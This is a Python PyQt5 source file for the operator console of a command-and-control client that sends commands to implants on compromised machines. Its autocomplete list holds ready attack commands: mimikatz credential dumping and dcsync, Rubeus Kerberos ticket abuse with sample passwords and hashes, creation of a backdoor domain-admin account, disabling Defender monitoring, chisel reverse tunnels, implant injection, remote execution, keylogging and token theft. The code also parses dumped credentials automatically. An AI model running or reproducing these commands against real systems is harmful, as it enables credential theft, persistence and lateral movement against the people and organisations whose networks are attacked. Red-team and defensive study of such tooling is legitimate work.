import sys
import os
import time
import re, html
from datetime import datetime
from threading import Thread, Lock
from PyQt5.QtWidgets import *
from PyQt5.QtGui import *
from PyQt5.QtCore import *

from grpcClient import *

from TerminalPanel import *
from ScriptPanel import *
from AssistantPanel import *

sys.path.insert(1, './Credentials')
import credentials


#
# Log
#
try:
    import pkg_resources
    logsDir = pkg_resources.resource_filename(
        'C2Client',  
        'logs' 
    )

except ImportError:
    logsDir = os.path.join(os.path.dirname(__file__), 'logs')

if not os.path.exists(logsDir):
    os.makedirs(logsDir)


#
# Constant
#
TerminalTabTitle = "Terminal"
CmdHistoryFileName = ".cmdHistory"

HelpInstruction = "help"
SleepInstruction = "sleep"
EndInstruction = "end"
ListenerInstruction = "listener"
LoadModuleInstruction = "loadModule"

AssemblyExecInstruction = "assemblyExec"
UploadInstruction = "upload"
RunInstruction = "run"
DownloadInstruction = "download"
InjectInstruction = "inject"
ScriptInstruction = "script"
PwdInstruction = "pwd"
CdInstruction = "cd"
LsInstruction = "ls"
PsInstruction = "ps"
CatInstruction = "cat"
TreeInstruction = "tree"
MakeTokenInstruction = "makeToken"
Rev2selfInstruction = "rev2self"
StealTokenInstruction = "stealToken"
CoffLoaderInstruction = "coffLoader"
UnloadModuleInstruction = "unloadModule"
KerberosUseTicketInstruction = "kerberosUseTicket"
PowershellInstruction = "powershell"
ChiselInstruction = "chisel"
PsExecInstruction = "psExec"
WmiInstruction = "wmiExec"
SpawnAsInstruction = "spawnAs"
EvasionInstruction = "evasion"
KeyLoggerInstruction = "keyLogger"
MiniDumpInstruction = "miniDump"
DotnetExecInstruction = "dotnetExec"

StartInstruction = "start"
StopInstruction = "stop"

completerData = [
    (HelpInstruction,[]),
    (SleepInstruction,[]),
    (EndInstruction,[]),
    (ListenerInstruction,[
            (StartInstruction+' smb pipename',[]),
            (StartInstruction+' tcp 127.0.0.1 4444',[]),
            (StopInstruction,  []),
             ]),
    (AssemblyExecInstruction,[
                        ('-e',[
                            ('mimikatz.exe',[
                                ('"!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "exit"',[]),
                                ('"privilege::debug" "lsadump::dcsync /domain:m3c.local /user:krbtgt" "exit"',[]),
                                ('"privilege::debug" "lsadump::lsa /inject /name:joe" "exit"',[]),
                                ('"sekurlsa::logonpasswords" "exit"',  []),
                                ('"sekurlsa::ekeys" "exit"',  []),
                                ('"lsadump::sam" "exit"',  []),
                                ('"lsadump::cache" "exit"',  []),
                                ('"lsadump::secrets" "exit"',  []),
                                ('"dpapi::chrome /in:"""C:\\Users\\CyberVuln\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"""" "exit"', []),
                                ('"dpapi::cred /in:C:\\Users\\joe\\AppData\\Local\\Microsoft\\Credentials\\DFBE70A7E5CC19A398EBF1B96859CE5D" "exit"', []),
                                ('"sekurlsa::dpapi" "exit"',  []),
                                ('"dpapi::masterkey /in:C:\\Users\\joe\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-308422719-809814085-1049341588-1001/36bf2476-ed68-4bf9-9604-c84a6e8bcb03 /rpc" "exit"',  []),
                            ]),
                            
                            ('SharpView.exe Get-DomainComputer',  []),
                            ('Rubeus.exe',[
                                ('triage',[]),
                                ('purge',[]),
                                ('asktgt /user:OFFSHORE_ADM /password:Banker!123 /domain:client.offshore.com /nowrap /ptt',  []),
                                ('s4u /user:MS02$ /aes256:a7ef524856fbf9113682384b725292dec23e54ab4e66cfdca8dd292b1bb198ae /impersonateuser:administrator /msdsspn:cifs/dc04.client.OFFSHORE.COM /altservice:host /nowrap /ptt',  []),
                            ]),
                            ('Seatbelt.exe',[
                                ('-group=system',[]),
                                ('-group=user',[]),
                            ]),
                            ('SharpHound.exe -c All -d dev.admin.offshore.com',  []),
                            ('SweetPotato.exe -e EfsRpc -p C:\\Users\\Public\\Documents\\implant.exe',  []),
                        ]),
                    ]),
    (UploadInstruction,[]),
    (RunInstruction,[
             ('cmd /c',  []),
             ('cmd /c sc query',  []),
             ('cmd /c wmic service where caption="Serviio" get name, caption, state, startmode',  []),
             ('cmd /c where /r c:\\ *.txt',  []),
             ('cmd /c tasklist /SVC',  []),
             ('cmd /c taskkill /pid 845 /f',  []),
             ('cmd /c schtasks /query /fo LIST /v',  []),
             ('cmd /c net user superadmin123 Password123!* /add',  []),
             ('cmd /c net localgroup administrators superadmin123 /add',  []),
             ('cmd /c net user superadmin123 Password123!* /add /domain',  []),
             ('cmd /c net group "domain admins" superadmin123 /add /domain',  []),
             ]),
    (DownloadInstruction,[]),
    (InjectInstruction,[
                ('-e BeaconHttp.exe -1 10.10.15.34 8443 https',  []),
                ('-e implant.exe -1',  []),
    ]),
    (ScriptInstruction,[]),
    (PwdInstruction,[]),
    (CdInstruction,[]),
    (LsInstruction,[]),
    (PsInstruction,[]),
    (CatInstruction,[]),
    (TreeInstruction,[]),
    (MakeTokenInstruction,[]),
    (Rev2selfInstruction,[]),
    (StealTokenInstruction,[]),
    (CoffLoaderInstruction,[
        ('adcs_enum.x64.o', [('go',[])]),
        ('adcs_enum_com.x64.o', [('go ZZ hostname sharename',[])]),
        ('adcs_enum_com2.x64.o', [('go',[])]),
        ('adv_audit_policies.x64.o', [('go',[])]),
        ('arp.x64.o', [('go',[])]),
        ('cacls.x64.o', [('go zz hostname servicename',[])]),
        ('dir.x64.o', [('go Zs targetdir subdirs',[])]),
        ('driversigs.x64.o', [('go Zi name, 0',[])]),
        ('enum_filter_driver.x64.o', [('go',[])]),
        ('enumlocalsessions.x64.o', [('go zz modname procname',[])]),
        ('env.x64.o', [('go',[])]),
        ('findLoadedModule.x64.o', [('go',[])]),
        ('get-netsession.x64.o', [('go',[])]),
        ('get_password_policy.x64.o', [('go Z server',[])]),
        ('ipconfig.x64.o', [('go',[])]),
        ('ldapsearch.x64.o', [('go zzizz 2 attributes result_limit hostname domain',[])]),
        ('listdns.x64.o', [('go',[])]),
        ('listmods.x64.o', [('go i pid',[])]),
        ('locale.x64.o', [('go',[])]),
        ('netgroup.x64.o', [('go sZZ type server group',[])]),
        ('netlocalgroup.x64.o', [('go',[])]),
        ('netshares.x64.o', [('go Zi name, 1',[])]),
        ('netstat.x64.o', [('go',[])]),
        ('netuse.x64.o', [('go sZZZZss 1 share user password device persist requireencrypt',[])]),
        ('netuser.x64.o', [('go ZZ 2 domain',[])]),
        ('netuserenum.x64.o', [('go',[])]),
        ('netview.x64.o', [('go Z domain',[])]),
        ('nonpagedldapsearch.x64.o', [('go zzizz 2 attributes result_limit hostname domain',[])]),
        ('nslookup.x64.o', [('go zzs lookup server type',[])]),
        ('probe.x64.o', [('go zi host port',[])]),
        ('reg_query.x64.o', [('go zizzi hostname hive path key, 0',[])]),
        ('resources.x64.o', [('go',[])]),
        ('routeprint.x64.o', [('go',[])]),
        ('sc_enum.x64.o', [('go',[])]),
        ('schtasksenum.x64.o', [('go ZZ 2 3',[])]),
        ('schtasksquery.x64.o', [('go',[])]),
        ('sc_qc.x64.o', [('go zz hostname servicename',[])]),
        ('sc_qdescription.x64.o', [('go zz hostname servicename',[])]),
        ('sc_qfailure.x64.o', [('go',[])]),
        ('sc_qtriggerinfo.x64.o', [('go',[])]),
        ('sc_query.x64.o', [('go',[])]),
        ('tasklist.x64.o', [('go Z system',[])]),
        ('uptime.x64.o', [('go',[])]),
        ('vssenum.x64.o', [('go',[])]),
        ('whoami.x64.o', [('go',[])]),
        ('windowlist.x64.o', [('go',[])]),
        ('wmi_query.x64.o', [('go ZZZ system namespace query',[])]),
    ]),
    (MiniDumpInstruction,  [
        ('dump dump.xor',  []),
        ('decrypt /tmp/dump.xor',  []),
    ]),
    (DotnetExecInstruction,  [
        ('load rub Rubeus.exe',  []),
        ('runExe rub help',  []),
    ]),
    (UnloadModuleInstruction,[
             (AssemblyExecInstruction, []),
             (CdInstruction, []),
             (CoffLoaderInstruction, []),
             (DownloadInstruction, []),
             (InjectInstruction, []),
             (LsInstruction, []),
             (PsInstruction, []),
             (MakeTokenInstruction, []),
             (PwdInstruction, []),
             (Rev2selfInstruction, []),
             (RunInstruction, []),
             (ScriptInstruction, []),
             (StealTokenInstruction, []),
             (UploadInstruction,  []),
             (PowershellInstruction,  []),
             (PsExecInstruction,  []),
             (KerberosUseTicketInstruction,  []),
             (ChiselInstruction,  []),
             (EvasionInstruction,  []),
             (SpawnAsInstruction,  []),
             (WmiInstruction,  []),
             (KeyLoggerInstruction,  []),
             (MiniDumpInstruction,  []),
             (DotnetExecInstruction,  []),
             ]),
    (KerberosUseTicketInstruction,[]),
    (PowershellInstruction,[
                ('-i PowerView.ps1',  []),
                ('Get-Domain',  []),
                ('Get-DomainTrust',  []),
                ('Get-DomainUser',  []),
                ('Get-DomainComputer -Properties DnsHostName',  []),
                ('powershell Get-NetSession -ComputerName MS01 | select CName, UserName',  []),
                ('-i PowerUp.ps1',  []),
                ('Invoke-AllChecks',  []),
                ('-i Powermad.ps1',  []),
                ('-i PowerUpSQL.ps1',  []),
                ('Set-MpPreference -DisableRealtimeMonitoring $true',  []),
                ]),
    (ChiselInstruction,[
                ('status',  []),
                ('stop',  []),
                ('chisel.exe client 192.168.57.21:9001 R:socks',  []),
                ('chisel.exe client 192.168.57.21:9001 R:445:192.168.57.14:445',  []),
                ]),
    (PsExecInstruction,[
        ('10.10.10.10 implant.exe',  []),
    ]),
    (WmiInstruction,[
        ('10.10.10.10 implant.exe',  []),
    ]),
    (SpawnAsInstruction,[
        ('user password implant.exe',  []),
    ]),
    (EvasionInstruction,[
        ('CheckHooks',  []),
        ('Unhook',  []),
    ]),
    (KeyLoggerInstruction,[
        ('start',  []),
        ('stop',  []),
        ('dump',  []),
    ]),
    (LoadModuleInstruction,[
             ('changeDirectory', []),
             ('listDirectory', []),
             ('listProcesses', []),
             ('printWorkingDirectory', []),
             (CdInstruction, []),
             (LsInstruction, []),
             (PsInstruction, []),
             (PwdInstruction, []),
             (AssemblyExecInstruction, []),
             (CoffLoaderInstruction, []),
             (DownloadInstruction, []),
             (InjectInstruction, []),
             (MakeTokenInstruction, []),
             (Rev2selfInstruction, []),
             (RunInstruction, []),
             (ScriptInstruction, []),
             (StealTokenInstruction, []),
             (UploadInstruction,  []),
             (PowershellInstruction,  []),
             (PsExecInstruction,  []),
             (KerberosUseTicketInstruction,  []),
             (ChiselInstruction,  []),
             (EvasionInstruction,  []),
             (SpawnAsInstruction,  []),
             (WmiInstruction,  []),
             (KeyLoggerInstruction,  []),
             (MiniDumpInstruction,  []),
             (DotnetExecInstruction,  []),
             ]),
]


#
# Fix console rendering
#
# Regexes
SGR_RE = re.compile(r'\x1b\[([0-9;]*)m')  # keep these for color -> HTML
OSC_RE = re.compile(r'\x1b\].*?(?:\x07|\x1b\\)', re.DOTALL)  # OSC ... BEL/ST
# Any CSI (ESC [ ... finalbyte), we'll later keep only the ones ending with 'm'
CSI_RE = re.compile(r'\x1b\[[0-?]*[ -/]*[@-~]')
# Single-char ESC sequences:
#  - ESC= / ESC> / ESC<  (keypad/app mode toggles)
#  - ESC @ .. ESC _      (misc single ESCs)
ESC_SINGLE_RE = re.compile(r'\x1b(?:[@-Z\\-_]|[=><])')

def normalize_cr(text: str) -> str:
    text = text.replace('\r\n', '\n')
    # treat stray CR as newline (instead of overwriting behavior)
    return re.sub(r'\r(?!\n)', '\n', text)

def apply_backspaces(text: str) -> str:
    out = []
    for ch in text:
        if ch == '\b':
            if out: out.pop()
        else:
            out.append(ch)
    return ''.join(out)

def strip_non_sgr_ansi(text: str) -> str:
    # 1) remove OSC
    text = OSC_RE.sub('', text)

    # 2) remove *non*-SGR CSI (keep those ending with 'm')
    def _keep_only_sgr(m):
        s = m.group(0)
        return s if s.endswith('m') else ''  # drop everything except SGR
    text = CSI_RE.sub(_keep_only_sgr, text)

    # 3) remove single-byte ESC sequences (ESC=, ESC>, ESCc, ESC(0, ESC)B, etc.)
    text = ESC_SINGLE_RE.sub('', text)

    return text

# Minimal SGR -> HTML
_BASE  = ['#000','#a00','#0a0','#a50','#00a','#a0a','#0aa','#aaa']
_BRIGHT= ['#555','#f55','#5f5','#ff5','#55f','#f5f','#5ff','#fff']

def _style_css(state):
    css=[]
    if state.get('bold'): css.append('font-weight:bold')
    if state.get('underline'): css.append('text-decoration:underline')
    if state.get('fg'): css.append(f"color:{state['fg']}")
    if state.get('bg'): css.append(f"background-color:{state['bg']}")
    return ';'.join(css)

def ansi_to_html(text: str) -> str:
    txt = html.escape(text)
    out=[]; pos=0; state={}; open_span=False
    for m in SGR_RE.finditer(txt):
        if m.start() > pos:
            chunk = txt[pos:m.start()].replace('\n','<br/>')
            if _style_css(state):
                if not open_span:
                    out.append(f'<span style="{_style_css(state)}">'); open_span=True
            out.append(chunk)
        pos = m.end()
        params = m.group(1)
        codes = [0] if params=='' else [int(c or 0) for c in params.split(';')]

        for c in codes:
            if c==0: state.clear()
            elif c==1: state['bold']=True
            elif c==4: state['underline']=True
            elif 30<=c<=37: state['fg']=_BASE[c-30]
            elif 90<=c<=97: state['fg']=_BRIGHT[c-90]
            elif 40<=c<=47: state['bg']=_BASE[c-40]
            elif 100<=c<=107: state['bg']=_BRIGHT[c-100]
            elif c==39: state.pop('fg',None)
            elif c==49: state.pop('bg',None)

        if open_span: out.append('</span>'); open_span=False
        if _style_css(state): out.append(f'<span style="{_style_css(state)}">'); open_span=True

    if pos < len(txt):
        chunk = txt[pos:].replace('\n','<br/>')
        if _style_css(state) and not open_span:
            out.append(f'<span style="{_style_css(state)}">'); open_span=True
        out.append(chunk)
    if open_span: out.append('</span>')
    return ''.join(out)
        

#
# Consoles Tab Implementation
#
class ConsolesTab(QWidget):
    
    def __init__(self, parent, grpcClient):
        super(QWidget, self).__init__(parent)
        widget = QWidget(self)
        self.layout = QHBoxLayout(widget)
        
        # Initialize tab screen
        self.tabs = QTabWidget()
        self.tabs.setTabsClosable(True)
        self.tabs.tabCloseRequested.connect(self.closeTab) 
                
        # Add tabs to widget
        self.layout.addWidget(self.tabs)
        self.setLayout(self.layout)

        self.grpcClient = grpcClient

        tab = QWidget()
        self.tabs.addTab(tab, TerminalTabTitle)
        tab.layout = QVBoxLayout(self.tabs)
        self.terminal = Terminal(self, self.grpcClient)
        tab.layout.addWidget(self.terminal)
        tab.setLayout(tab.layout)
        self.tabs.setCurrentIndex(self.tabs.count()-1)

        tab = QWidget()
        self.tabs.addTab(tab, "Script")
        tab.layout = QVBoxLayout(self.tabs)
        self.script = Script(self, self.grpcClient)
        tab.layout.addWidget(self.script)
        tab.setLayout(tab.layout)
        self.tabs.setCurrentIndex(self.tabs.count()-1)

        tab = QWidget()
        self.tabs.addTab(tab, "Assistant")
        tab.layout = QVBoxLayout(self.tabs)
        self.assistant = Assistant(self, self.grpcClient)
        tab.layout.addWidget(self.assistant)
        tab.setLayout(tab.layout)
        self.tabs.setCurrentIndex(self.tabs.count()-1)
        
    @pyqtSlot()
    def on_click(self):
        print("\n")
        for currentQTableWidgetItem in self.tableWidget.selectedItems():
            print(currentQTableWidgetItem.row(), currentQTableWidgetItem.column(), currentQTableWidgetItem.text())

    def addConsole(self, beaconHash, listenerHash, hostname, username):
        tabAlreadyOpen=False
        for idx in range(0,self.tabs.count()):
            openTabKey = self.tabs.tabText(idx)
            if openTabKey==beaconHash[0:8]:
                self.tabs.setCurrentIndex(idx)
                tabAlreadyOpen=True

        if tabAlreadyOpen==False:
            tab = QWidget()
            self.tabs.addTab(tab, beaconHash[0:8])
            tab.layout = QVBoxLayout(self.tabs)
            console = Console(self, self.grpcClient, beaconHash, listenerHash, hostname, username)
            console.consoleScriptSignal.connect(self.script.consoleScriptMethod)
            console.consoleScriptSignal.connect(self.assistant.consoleAssistantMethod)
            tab.layout.addWidget(console)
            tab.setLayout(tab.layout)
            self.tabs.setCurrentIndex(self.tabs.count()-1)

    def closeTab(self, currentIndex):
        currentQWidget = self.tabs.widget(currentIndex)
        if currentIndex<3:
            return
        currentQWidget.deleteLater()
        self.tabs.removeTab(currentIndex)


class Console(QWidget):

    consoleScriptSignal = pyqtSignal(str, str, str, str, str, str)

    tabPressed = pyqtSignal()
    beaconHash=""
    hostname=""
    username=""
    logFileName=""
    listenerHash=""

    def __init__(self, parent, grpcClient, beaconHash, listenerHash, hostname, username):
        super(QWidget, self).__init__(parent)
        self.layout = QVBoxLayout(self)

        self.grpcClient = grpcClient

        self.beaconHash=beaconHash
        self.listenerHash=listenerHash
        self.hostname=hostname.replace("\\", "_").replace(" ", "_")
        self.username=username.replace("\\", "_").replace(" ", "_")
        self.logFileName=self.hostname+"_"+self.username+"_"+self.beaconHash+".log"

        self.editorOutput = QTextEdit()
        self.editorOutput.setReadOnly(True)
        self.editorOutput.setAcceptRichText(True)
        self.editorOutput.setFont(QFont("JetBrainsMono Nerd Font")) 
        self.layout.addWidget(self.editorOutput, 8)

        self.commandEditor = CommandEditor()
        self.layout.addWidget(self.commandEditor, 2)
        self.commandEditor.returnPressed.connect(self.runCommand)

        # Thread to get sessions response
        # https://realpython.com/python-pyqt-qthread/
        self.thread = QThread()
        self.getSessionResponse = GetSessionResponse()
        self.getSessionResponse.moveToThread(self.thread)
        self.thread.started.connect(self.getSessionResponse.run)
        self.getSessionResponse.checkin.connect(self.displayResponse)
        self.thread.start()

    def __del__(self):
        self.getSessionResponse.quit()
        self.thread.quit()
        self.thread.wait()

    def nextCompletion(self):
        index = self._compl.currentIndex()
        self._compl.popup().setCurrentIndex(index)
        start = self._compl.currentRow()
        if not self._compl.setCurrentRow(start + 1):
            self._compl.setCurrentRow(0)

    def event(self, event):
        if event.type() == QEvent.KeyPress and event.key() == Qt.Key_Tab:
            self.tabPressed.emit()
            return True
        return super().event(event)

    def printInTerminal(self, cmdSent, cmdReived, result):
        now = datetime.now()
        sendFormater = '<p style="white-space:pre">'+'<span style="color:blue;">['+now.strftime("%Y:%m:%d %H:%M:%S").rstrip()+']</span>'+'<span style="color:orange;"> [&gt;&gt;] </span>'+'<span style="color:orange;">{}</span>'+'</p>'
        receiveFormater = '<p style="white-space:pre">'+'<span style="color:blue;">['+now.strftime("%Y:%m:%d %H:%M:%S").rstrip()+']</span>'+'<span style="color:red;"> [&lt;&lt;] </span>'+'<span style="color:red;">{}</span>'+'</p>'

        if cmdSent:
            self.editorOutput.insertHtml(sendFormater.format(cmdSent))
            self.editorOutput.insertPlainText("\n")
        elif cmdReived:
            self.editorOutput.insertHtml(receiveFormater.format(cmdReived))
            self.editorOutput.insertPlainText("\n")
        if result:

            s = normalize_cr(result)
            s = apply_backspaces(s)
            s = strip_non_sgr_ansi(s)
            # Convert remaining color SGR
            html_body = ansi_to_html(s)

            html = (
                "<pre style=\"margin:0;"
                "white-space:pre-wrap;"
                "font-family:'JetBrainsMono Nerd Font','FiraCode Nerd Font','DejaVu Sans Mono','Noto Sans Mono',monospace;\">"
                f"{html_body}"
                "</pre>"
            )
            self.editorOutput.insertHtml(html)
            self.editorOutput.insertHtml("<br/>")
            self.editorOutput.insertPlainText("\n")

    def runCommand(self):
        commandLine = self.commandEditor.displayText()
        self.commandEditor.clearLine()
        self.setCursorEditorAtEnd()

        if commandLine == "":
            self.printInTerminal("", "", "")

        else:
            cmdHistoryFile = open(CmdHistoryFileName, 'a')
            cmdHistoryFile.write(commandLine)
            cmdHistoryFile.write('\n')
            cmdHistoryFile.close()

            logFile = open(logsDir+"/"+self.logFileName, 'a')
            logFile.write('[+] send: \"' + commandLine + '\"')
            logFile.write('\n')
            logFile.close()

            self.commandEditor.setCmdHistory()
            instructions = commandLine.split()
            if instructions[0]==HelpInstruction:
                command = TeamServerApi_pb2.Command(beaconHash=self.beaconHash, listenerHash=self.listenerHash, cmd=commandLine)
                response = self.grpcClient.getHelp(command)
                self.printInTerminal(response.cmd, "", "")
                self.printInTerminal("", response.cmd, response.response.decode('utf-8', 'replace'))

            else:
                self.printInTerminal(commandLine, "", "")
                command = TeamServerApi_pb2.Command(beaconHash=self.beaconHash, listenerHash=self.listenerHash, cmd=commandLine)
                result = self.grpcClient.sendCmdToSession(command)
                context = "Host " + self.hostname + " - Username " + self.username
                self.consoleScriptSignal.emit("send", self.beaconHash, self.listenerHash, context, commandLine, "")
                if result.message:
                    self.printInTerminal("", commandLine, result.message.decode('utf-8', 'replace'))

        self.setCursorEditorAtEnd()

    def displayResponse(self):
        session = TeamServerApi_pb2.Session(beaconHash=self.beaconHash)
        responses = self.grpcClient.getResponseFromSession(session)
        for response in responses:
            context = "Host " + self.hostname + " - Username " + self.username
            self.consoleScriptSignal.emit("receive", "", "", context, response.cmd, response.response.decode('utf-8', 'replace'))
            self.setCursorEditorAtEnd()
            # check the response for mimikatz and not the cmd line ???
            if "-e mimikatz.exe" in response.cmd:
                credentials.handleMimikatzCredentials(response.response.decode('utf-8', 'replace'), self.grpcClient, TeamServerApi_pb2)
            self.printInTerminal("", response.instruction + " " + response.cmd, response.response.decode('utf-8', 'replace'))
            self.setCursorEditorAtEnd()

            logFile = open(logsDir+"/"+self.logFileName, 'a')
            logFile.write('[+] result: \"' + response.instruction + " " + response.cmd + '\"')
            logFile.write('\n' + response.response.decode('utf-8', 'replace')  + '\n')
            logFile.write('\n')
            logFile.close()

    def setCursorEditorAtEnd(self):
        cursor = self.editorOutput.textCursor()
        cursor.movePosition(QTextCursor.End,)
        self.editorOutput.setTextCursor(cursor)
    

class GetSessionResponse(QObject):
    checkin = pyqtSignal()

    exit=False

    def run(self):
        while self.exit==False:
            self.checkin.emit()
            time.sleep(1)

    def quit(self):
        self.exit=True


class CommandEditor(QLineEdit):
    tabPressed = pyqtSignal()
    cmdHistory = []
    idx = 0

    def __init__(self, parent=None):
        super().__init__(parent)

        if(os.path.isfile(CmdHistoryFileName)):
            cmdHistoryFile = open(CmdHistoryFileName)
            self.cmdHistory = cmdHistoryFile.readlines()
            self.idx=len(self.cmdHistory)-1
            cmdHistoryFile.close()

        QShortcut(Qt.Key_Up, self, self.historyUp)
        QShortcut(Qt.Key_Down, self, self.historyDown)

        self.codeCompleter = CodeCompleter(completerData, self)
        # needed to clear the completer after activation
        self.codeCompleter.activated.connect(self.onActivated)
        self.setCompleter(self.codeCompleter)
        self.tabPressed.connect(self.nextCompletion)

    def nextCompletion(self):
        index = self.codeCompleter.currentIndex()
        self.codeCompleter.popup().setCurrentIndex(index)
        start = self.codeCompleter.currentRow()
        if not self.codeCompleter.setCurrentRow(start + 1):
            self.codeCompleter.setCurrentRow(0)

    def event(self, event):
        if event.type() == QEvent.KeyPress and event.key() == Qt.Key_Tab:
            self.tabPressed.emit()
            return True
        return super().event(event)

    def historyUp(self):
        if(self.idx<len(self.cmdHistory) and self.idx>=0):
            cmd = self.cmdHistory[self.idx%len(self.cmdHistory)]
            self.idx=max(self.idx-1,0)
            self.setText(cmd.strip())

    def historyDown(self):
        if(self.idx<len(self.cmdHistory) and self.idx>=0):
            self.idx=min(self.idx+1,len(self.cmdHistory)-1)
            cmd = self.cmdHistory[self.idx%len(self.cmdHistory)]
            self.setText(cmd.strip())

    def setCmdHistory(self):
        cmdHistoryFile = open(CmdHistoryFileName)
        self.cmdHistory = cmdHistoryFile.readlines()
        self.idx=len(self.cmdHistory)-1
        cmdHistoryFile.close()

    def clearLine(self):
        self.clear()

    def onActivated(self):
        QTimer.singleShot(0, self.clear)


class CodeCompleter(QCompleter):
    ConcatenationRole = Qt.UserRole + 1

    def __init__(self, data, parent=None):
        super().__init__(parent)
        self.createModel(data)

    def splitPath(self, path):
        return path.split(' ')

    def pathFromIndex(self, ix):
        return ix.data(CodeCompleter.ConcatenationRole)

    def createModel(self, data):
        def addItems(parent, elements, t=""):
            for text, children in elements:
                item = QStandardItem(text)
                data = t + " " + text if t else text
                item.setData(data, CodeCompleter.ConcatenationRole)
                parent.appendRow(item)
                if children:
                    addItems(item, children, data)
        model = QStandardItemModel(self)
        addItems(model, data)
        self.setModel(model)
